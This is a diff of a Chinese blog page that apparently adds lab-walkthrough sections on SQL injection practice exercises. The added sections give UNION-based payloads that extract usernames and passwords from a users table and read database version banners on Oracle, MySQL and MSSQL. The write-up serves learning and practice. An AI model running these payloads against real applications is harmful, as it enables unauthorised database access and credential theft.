@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211162236391.jpg">
 <meta property="article:published_time" content="2022-11-16T14:31:35.000Z">
-<meta property="article:modified_time" content="2022-11-17T10:45:34.004Z">
+<meta property="article:modified_time" content="2022-11-18T13:17:43.053Z">
 <meta property="article:author" content="QY">
 <meta property="article:tag" content="burpsuite靶场">
 <meta property="article:tag" content="sql注入">
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          744 字
+          1.5k 字
         
       </span>
     
@@ -234,7 +234,7 @@
         
         
         
-          7 分钟
+          13 分钟
         
       </span>
     
@@ -300,20 +300,65 @@
 <figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scheme"><span class="hljs-number">1</span><span class="hljs-symbol">&#x27;+or+</span><span class="hljs-symbol">&#x27;1</span><span class="hljs-symbol">&#x27;=</span><span class="hljs-symbol">&#x27;1</span><br></code></pre></td></tr></table></figure>
 
 <hr>
-<h3 id="3-SQL-注入-UNION-攻击，确定查询返回的列数"><a href="#3-SQL-注入-UNION-攻击，确定查询返回的列数" class="headerlink" title="3.SQL 注入 UNION 攻击，确定查询返回的列数"></a>3.SQL 注入 UNION 攻击，确定查询返回的列数</h3><p>这一关需要我们判断列数，联合查询判断列数的方法常用两种</p>
+<h3 id="3-确定查询返回的列数"><a href="#3-确定查询返回的列数" class="headerlink" title="3.确定查询返回的列数"></a>3.确定查询返回的列数</h3><p>这一关需要我们判断列数，联合查询判断列数的方法常用两种</p>
 <figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">1</span> <span class="hljs-comment">--+  </span><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
 
 <p>这里列数为三因此输入</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; order by 3 --+</span><br><span class="hljs-string">或者</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span> <span class="hljs-comment">--+ //这里只是判断列数但是吗，没有地方回显因此填null如果填数值会一直错</span><br></code></pre></td></tr></table></figure>
 
 <p>完成</p>
-<h3 id="4-SQL-注入-UNION-攻击，查找包含文本的列"><a href="#4-SQL-注入-UNION-攻击，查找包含文本的列" class="headerlink" title="4.SQL 注入 UNION 攻击，查找包含文本的列"></a>4.SQL 注入 UNION 攻击，查找包含文本的列</h3><p>前面知道了有三列</p>
+<h3 id="4-查找包含文本的列"><a href="#4-查找包含文本的列" class="headerlink" title="4.查找包含文本的列"></a>4.查找包含文本的列</h3><p>前面知道了有三列</p>
 <p>现在这关是让我们测试他的回显，三列在回显的地方填数据，不回显填null</p>
 <figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vhdl">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><span class="hljs-comment">-- </span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;,<span class="hljs-keyword">NULL</span><span class="hljs-comment">--</span><br>&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">null</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-symbol">&#x27;abcdef</span>&#x27;<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
 <p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211171153773.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
 <p>当不报错时就是完成了实验</p>
+<h3 id="5-从其他表中检索数据"><a href="#5-从其他表中检索数据" class="headerlink" title="5.从其他表中检索数据"></a>5.从其他表中检索数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="hljs-string">&#x27;,&#x27;</span>def<span class="hljs-string">&#x27;--</span><br></code></pre></td></tr></table></figure>
 
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182046102.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>发现列数为二而且两列都有返</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182048533.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>根据题目提示可以直接查询user表的内容 payload为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+username,+password+FROM+users--</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182049642.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<p>查询出所有账号和密码登录完成实验</p>
+<h3 id="6-在单个列中检索多个值"><a href="#6-在单个列中检索多个值" class="headerlink" title="6.在单个列中检索多个值"></a>6.在单个列中检索多个值</h3><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182054628.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
+
+<p>这关虽然有两列但是只有一个回显</p>
+<p>使用payload可以在一个回显查询两个列值，用~隔开</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+NULL,username||&#x27;</span><span class="hljs-operator">~</span><span class="hljs-string">&#x27;||password+FROM+users--</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182056881.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:67%;" />
+
+<h3 id="7-查询Oracle上的数据库类型和版本"><a href="#7-查询Oracle上的数据库类型和版本" class="headerlink" title="7.查询Oracle上的数据库类型和版本"></a>7.查询Oracle上的数据库类型和版本</h3><p>这题是针对Oracle的注入</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182100113.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>针对不同的数据库进行注入语法会不同</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182103872.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="hljs-string">&#x27;,&#x27;</span>def<span class="hljs-string">&#x27;+FROM+dual--</span><br><span class="hljs-string"></span><br><span class="hljs-string">//虽然这个payload是用来判断列数和找回显，但是由于Oracle 数据库的语法要求必须跟着一个表</span><br></code></pre></td></tr></table></figure>
+
+<p>成功找到回显</p>
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182105280.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p><strong>v$version视图</strong></p>
+<p>通过确认v$version视图的banner信息可以确认oracle各组件的版本信息</p>
+<p>所以构造payload查询数据库信息</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;+UNION+<span class="hljs-keyword">SELECT</span>+banner,<span class="hljs-symbol">&#x27;def</span>&#x27;+FROM+v$version<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>查询成功</p>
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182108894.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload style="zoom:80%;" />
+
+<h3 id="8-在MySQL和Microsoft上查询数据库类型和版本"><a href="#8-在MySQL和Microsoft上查询数据库类型和版本" class="headerlink" title="8.在MySQL和Microsoft上查询数据库类型和版本"></a>8.在MySQL和Microsoft上查询数据库类型和版本</h3><p>这一关还是不同数据库的注入熟悉</p>
+<p>先确定列数和找出回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;+UNION+SELECT+&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-number">123</span><span class="hljs-string">&#x27;--+</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182115577.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload></p>
+<p>再查询数据库版本</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">&#x27;+<span class="hljs-built_in">UNION</span>+<span class="hljs-built_in">SELECT</span>+<span class="hljs-comment">@@</span>version,&#x27;<span class="hljs-number">123</span>&#x27;--+<br></code></pre></td></tr></table></figure>
+
+<img src="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211182117739.png" srcset="https://blog-imgs-1307281339.cos.ap-guangzhou.myqcloud.com/blog-imgs/202211102107768.gif" lazyload  style="zoom:80%;" />
                 
               </div>
             
@@ -404,6 +449,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2022/11/18/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%B8%89/" title="红日靶场三">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">红日靶场三</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
